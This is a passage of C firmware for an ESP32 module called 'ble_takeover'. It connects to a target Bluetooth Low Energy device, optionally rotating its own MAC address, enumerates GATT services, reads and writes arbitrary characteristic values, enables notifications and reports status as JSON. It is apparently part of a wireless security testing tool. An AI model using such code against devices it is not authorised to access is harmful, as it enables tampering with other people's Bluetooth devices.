                sizeof(default_cfg.target_addr) - 1);
    }
    ble_takeover_start_config(&default_cfg);
}

void ble_takeover_start_config(const ble_takeover_config_t *new_cfg)
{
    if (running) {
        ESP_LOGW(TAG, "Already running -- stop first");
        return;
    }

    xSemaphoreTake(mutex, portMAX_DELAY);
    if (new_cfg) {
        cfg = *new_cfg;
    }
    cfg.target_addr[sizeof(cfg.target_addr) - 1] = '\0';
    xSemaphoreGive(mutex);

    /* Reset counters */
    connect_count       = 0;
    read_count          = 0;
    write_count         = 0;
    notify_rx_count     = 0;
    notify_enabled_count = 0;
    enc_change_count    = 0;
    fail_count          = 0;
    status13_count      = 0;
    takeover_state      = BLE_TAKEOVER_IDLE;
    active_conn_handle  = 0xFFFF;
    active_addr_type    = BLE_ADDR_PUBLIC;
    timeout_fired       = false;

    /* Reset semaphores */
    if (conn_done_sem) xSemaphoreTake(conn_done_sem, 0);
    if (read_sem)      xSemaphoreTake(read_sem, 0);
    if (write_sem)     xSemaphoreTake(write_sem, 0);
    if (cccd_sem)      xSemaphoreTake(cccd_sem, 0);

    /* Start timeout timer */
    if (timeout_timer) {
        esp_timer_start_once(timeout_timer,
                             (uint64_t)cfg.timeout_sec * 1000000);
    }

    running = true;

    BaseType_t created = xTaskCreate(takeover_task, "ble_takeover",
                                     TASK_STACK_SIZE, NULL,
                                     TASK_PRIORITY, &task_handle);
    if (created != pdPASS) {
        ESP_LOGE(TAG, "Failed to create takeover task");
        running = false;
        if (timeout_timer) {
            esp_timer_stop(timeout_timer);
        }
    }
}

void ble_takeover_stop(void)
{
    if (!running) return;

    ESP_LOGI(TAG, "Stopping BLE takeover...");
    running = false;

    /* Wake task if blocked on any semaphore */
    if (conn_done_sem) xSemaphoreGive(conn_done_sem);
    if (read_sem)      xSemaphoreGive(read_sem);
    if (write_sem)     xSemaphoreGive(write_sem);
    if (cccd_sem)      xSemaphoreGive(cccd_sem);

    /* Wait for task to exit */
    if (task_exit_sem) {
        if (xSemaphoreTake(task_exit_sem, pdMS_TO_TICKS(STOP_SEM_TIMEOUT_MS)) != pdTRUE) {
            ESP_LOGW(TAG, "Task exit timeout");
            if (task_handle != NULL) {
                vTaskDelete(task_handle);
                task_handle = NULL;
            }
        }
    }

    if (timeout_timer) {
        esp_timer_stop(timeout_timer);
    }

    restore_sm_config();
    takeover_state = BLE_TAKEOVER_IDLE;
    active_conn_handle = 0xFFFF;
    task_handle = NULL;

    ESP_LOGI(TAG, "BLE takeover stopped (connects=%u, reads=%u, writes=%u)",
             (unsigned)connect_count, (unsigned)read_count, (unsigned)write_count);
}

/* ================================================================== */
/*  Public API -- Status getters                                       */
/* ================================================================== */

bool ble_takeover_is_running(void)
{
    return running;
}

takeover_state_t ble_takeover_get_state(void)
{
    return takeover_state;
}

uint32_t ble_takeover_get_connect_count(void)
{
    return connect_count;
}

uint32_t ble_takeover_get_svc_count(void)
{
    return (uint32_t)svc_count;
}

uint32_t ble_takeover_get_chr_count(void)
{
    return (uint32_t)chr_count;
}

uint32_t ble_takeover_get_read_count(void)
{
    return read_count;
}

uint32_t ble_takeover_get_write_count(void)
{
    return write_count;
}

uint32_t ble_takeover_get_notify_rx_count(void)
{
    return notify_rx_count;
}

uint32_t ble_takeover_get_notify_enabled_count(void)
{
    return notify_enabled_count;
}

uint32_t ble_takeover_get_enc_change_count(void)
{
    return enc_change_count;
}

uint32_t ble_takeover_get_fail_count(void)
{
    return fail_count;
}

int32_t ble_takeover_get_elapsed_sec(void)
{
    if (!running && start_time_ms == 0) return 0;
    int64_t elapsed = now_ms() - start_time_ms;
    return (int32_t)(elapsed / 1000);
}

int32_t ble_takeover_get_remaining_sec(void)
{
    if (!running) return 0;
    int32_t elapsed  = ble_takeover_get_elapsed_sec();
    int32_t remaining = (int32_t)cfg.timeout_sec - elapsed;
    return remaining > 0 ? remaining : 0;
}

bool ble_takeover_was_timeout(void)
{
    return timeout_fired;
}

cJSON *ble_takeover_get_status_json(void)
{
    cJSON *root = cJSON_CreateObject();
    if (!root) return NULL;

    cJSON_AddBoolToObject(root, "running", running);
    cJSON_AddStringToObject(root, "state", ble_takeover_get_state_str());
    cJSON_AddStringToObject(root, "target",
                            cfg.target_addr[0] ? cfg.target_addr : "");
    cJSON_AddNumberToObject(root, "timeout_sec", cfg.timeout_sec);
    cJSON_AddNumberToObject(root, "connect_count", connect_count);
    cJSON_AddNumberToObject(root, "svc_count", svc_count);
    cJSON_AddNumberToObject(root, "chr_count", chr_count);
    cJSON_AddNumberToObject(root, "read_count", read_count);
    cJSON_AddNumberToObject(root, "write_count", write_count);
    cJSON_AddNumberToObject(root, "notify_rx_count", notify_rx_count);
    cJSON_AddNumberToObject(root, "notify_enabled", notify_enabled_count);
    cJSON_AddNumberToObject(root, "enc_change_count", enc_change_count);
    cJSON_AddNumberToObject(root, "fail_count", fail_count);
    cJSON_AddNumberToObject(root, "elapsed_sec",
                            ble_takeover_get_elapsed_sec());
    cJSON_AddNumberToObject(root, "remaining_sec",
                            ble_takeover_get_remaining_sec());
    cJSON_AddBoolToObject(root, "timeout", timeout_fired);
    cJSON_AddStringToObject(root, "addr_type", addr_type_str(cfg.addr_type));
    cJSON_AddBoolToObject(root, "auto_enable_notifies", cfg.auto_enable_notifies);
    cJSON_AddBoolToObject(root, "rotate_mac", cfg.rotate_own_mac);

    return root;
}

/* ================================================================== */
/*  Interactive operations (only while CONNECTED)                      */
/* ================================================================== */

bool ble_takeover_read_chr(uint16_t handle)
{
    if (takeover_state != BLE_TAKEOVER_CONNECTED || active_conn_handle == 0xFFFF) {
        return false;
    }

    read_value_hex[0] = '\0';
    read_success = false;
    read_handle_done = handle;

    if (read_sem) xSemaphoreTake(read_sem, 0);

    int rc = ble_gattc_read(active_conn_handle, handle, read_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Read start failed: %d", rc);
        return false;
    }

    if (read_sem && xSemaphoreTake(read_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
        ESP_LOGW(TAG, "Read timeout");
        return false;
    }

    return read_success;
}

const char *ble_takeover_get_read_result(void)
{
    static char json[512];
    snprintf(json, sizeof(json),
             "{\"success\":%s,\"handle\":%d,\"value\":\"%s\"}",
             read_success ? "true" : "false",
             read_handle_done,
             read_value_hex);
    return json;
}

bool ble_takeover_write_chr(uint16_t handle, const char *hex_value)
{
    if (takeover_state != BLE_TAKEOVER_CONNECTED || active_conn_handle == 0xFFFF) {
        return false;
    }

    uint8_t data[128];
    int len = hex_to_bytes(hex_value, data, sizeof(data));
    if (len <= 0) {
        ESP_LOGW(TAG, "Invalid hex: %s", hex_value);
        return false;
    }

    write_success = false;
    write_handle_done = handle;

    if (write_sem) xSemaphoreTake(write_sem, 0);

    struct os_mbuf *om = ble_hs_mbuf_from_flat(data, len);
    if (om == NULL) {
        ESP_LOGE(TAG, "Failed to allocate mbuf");
        return false;
    }

    int rc = ble_gattc_write(active_conn_handle, handle, om, write_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "Write start failed: %d", rc);
        os_mbuf_free_chain(om);
        return false;
    }

    if (write_sem && xSemaphoreTake(write_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
        ESP_LOGW(TAG, "Write timeout");
        return false;
    }

    return write_success;
}

bool ble_takeover_enable_notify(uint16_t val_handle, bool enable)
{
    if (takeover_state != BLE_TAKEOVER_CONNECTED || active_conn_handle == 0xFFFF) {
        return false;
    }

    /* Find the characteristic and its CCCD handle */
    chr_entry_t *chr_ptr = NULL;
    for (int i = 0; i < chr_count; i++) {
        if (chrs[i].val_handle == val_handle) {
            chr_ptr = &chrs[i];
            break;
        }
    }

    if (chr_ptr == NULL) {
        ESP_LOGW(TAG, "Characteristic not found for handle %d", val_handle);
        return false;
    }

    uint16_t val = enable ? 0x0001 : 0x0000;
    /* If it supports indicate too, enable both */
    if (enable && (chr_ptr->properties & BLE_GATT_CHR_F_INDICATE)) {
        val = 0x0003;
    }

    if (cccd_sem) xSemaphoreTake(cccd_sem, 0);

    struct os_mbuf *om = ble_hs_mbuf_from_flat(&val, 2);
    if (om == NULL) {
        ESP_LOGE(TAG, "Failed to allocate mbuf for CCCD");
        return false;
    }

    int rc = ble_gattc_write(active_conn_handle, chr_ptr->cccd_handle,
                             om, cccd_write_cb, NULL);
    if (rc != 0) {
        ESP_LOGW(TAG, "CCCD write start failed: %d", rc);
        os_mbuf_free_chain(om);
        return false;
    }

    if (cccd_sem && xSemaphoreTake(cccd_sem, pdMS_TO_TICKS(3000)) != pdTRUE) {
        ESP_LOGW(TAG, "CCCD write timeout");
        return false;
    }

    if (cccd_success && enable) {
        chr_ptr->notify_enabled = true;
        notify_enabled_count++;
    } else if (!enable) {
        chr_ptr->notify_enabled = false;
        if (notify_enabled_count > 0) notify_enabled_count--;
    }

    ESP_LOGI(TAG, "Notify %s on handle %d: %s",
             enable ? "enabled" : "disabled", val_handle,
             cccd_success ? "OK" : "FAIL");

    return cccd_success;
}

const char *ble_takeover_get_services_json(void)
{
    static char buf[6144];
    int o = 0;

    o += snprintf(buf + o, sizeof(buf) - o,
                  "{\"state\":\"%s\",\"addr\":\"%s\",\"services\":[",
                  ble_takeover_get_state_str(),
                  cfg.target_addr[0] ? cfg.target_addr : "");

    for (int i = 0; i < svc_count && o < (int)sizeof(buf) - 200; i++) {
        if (i > 0) o += snprintf(buf + o, sizeof(buf) - o, ",");
        char uuid_str[40];
        uuid_to_str(&svcs[i].uuid, uuid_str, sizeof(uuid_str));
        o += snprintf(buf + o, sizeof(buf) - o,
                      "{\"uuid\":\"%s\",\"start\":%d,\"end\":%d,\"chars\":[",
                      uuid_str, svcs[i].start_handle, svcs[i].end_handle);

        int first = 1;
        for (int j = 0; j < chr_count && o < (int)sizeof(buf) - 200; j++) {
            if (chrs[j].svc_idx != i) continue;
            if (!first) o += snprintf(buf + o, sizeof(buf) - o, ",");
            first = 0;

            char cuuid[40], props[8];
            uuid_to_str(&chrs[j].uuid, cuuid, sizeof(cuuid));
            props_to_str(chrs[j].properties, props, sizeof(props));
            o += snprintf(buf + o, sizeof(buf) - o,
                          "{\"uuid\":\"%s\",\"handle\":%d,\"val\":%d,\"cccd\":%d,\"props\":\"%s\",\"notify\":%s}",
                          cuuid, chrs[j].handle, chrs[j].val_handle,
                          chrs[j].cccd_handle, props,
                          chrs[j].notify_enabled ? "true" : "false");
        }

        o += snprintf(buf + o, sizeof(buf) - o, "]}");
    }

    o += snprintf(buf + o, sizeof(buf) - o, "]}");
    return buf;
}

const char *ble_takeover_get_notifications_json(void)
{
    static char buf[4096];
    int o = 0;

    o += snprintf(buf + o, sizeof(buf) - o, "{\"count\":%d,\"entries\":[", notif_count);

    if (notif_count > 0) {
        /* Output in order: oldest to newest */
        int start = (notif_count < MAX_NOTIF_LOG) ? 0 : notif_head;
        for (int i = 0; i < notif_count && o < (int)sizeof(buf) - 200; i++) {
            int idx = (start + i) % MAX_NOTIF_LOG;
            if (i > 0) o += snprintf(buf + o, sizeof(buf) - o, ",");
            o += snprintf(buf + o, sizeof(buf) - o,
                          "{\"handle\":%d,\"value\":\"%s\",\"time\":%lld}",
                          notif_log[idx].handle,
                          notif_log[idx].value_hex,
                          (long long)notif_log[idx].timestamp_ms);
        }
    }

    o += snprintf(buf + o, sizeof(buf) - o, "]}");
    return buf;
}
